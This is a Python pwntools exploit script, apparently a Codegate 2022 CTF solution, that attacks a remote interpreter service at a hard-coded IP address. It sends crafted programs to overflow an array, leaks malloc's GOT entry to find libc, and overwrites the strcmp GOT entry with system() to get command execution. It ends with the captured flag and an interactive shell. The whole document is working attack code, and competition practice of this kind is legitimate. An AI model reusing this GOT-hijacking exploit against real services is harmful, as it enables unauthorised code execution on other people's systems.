from pwn import *

con = remote("13.124.135.163", 3000)

MALLOC_OFFSET = 0xA5120
SYSTEM_OFFSET = 0x50d60

def gen_overwrite_str(addr):
    overwrite = [
        0,
        0,
        0,
        0x31,
        u64(b"AAAAAAAA"),
        u64(b"BBBBBBBB"),
        u64(b"CCCCCCCC"),
        0,
        0,
        0x21,
        0x421d97, # name buffer "abort"
        addr,
        (0x10 << 32) | 5, # length
    ]

    ret = b""

    for v in overwrite:
        if ret != b"":
            ret += b","
        ret += str(v & 0xffffffff).encode() + b","
        ret += str(v >> 32).encode()
    
    return ret

overwrite_str = gen_overwrite_str(0x600110) # malloc GOT address

payload = (b"""
val overflowthisarray = [1]
val thisarraywillbeoverwritten = [12345,12345,12345]
val fun = overflowthisarray => abort
val x = fun([%s])
""" % overwrite_str).strip()

con.recvuntil(b">> ")
for line in payload.split(b"\n"):
    con.sendline(line)
    print("Sent: " + line.decode())
    print("Recv: " + con.recvuntil(b">> ", drop=True).decode().strip())

con.sendline(b"x[0]")
lo = int(con.recvuntil(b">> ", drop=True).strip())
con.sendline(b"x[1]")
hi = int(con.recvuntil(b">> ", drop=True).strip())

addr_leak = (hi << 32) + lo
log.success("malloc: %x" % addr_leak)

libc_base = addr_leak - MALLOC_OFFSET
log.success("libc: %x" % libc_base)

system = libc_base + SYSTEM_OFFSET
to_overwrite = system & 0xffffffff
if to_overwrite >= 0x80000000:
    to_overwrite -= 1 << 32

overwrite_str = gen_overwrite_str(0x600120) # strcmp GOT address

payload = (b"""
val Overflowthisarray = [1]
val Thisarraywillbeoverwritten = [12345,12345,12345]
val Fun = Overflowthisarray => abort[0] = %d
Fun([%s])
""" % (to_overwrite, overwrite_str)).strip()

for line in payload.split(b"\n"):
    con.sendline(line)
    print("Sent: " + line.decode())
    print("Recv: " + con.recvuntil(b">> ", drop=True).decode().strip())

# codegate2022{a3c7889d9d5e7ec243bc6c5dd97efae34467b721c54f0ce3ea707edf62835ba2}
con.interactive()
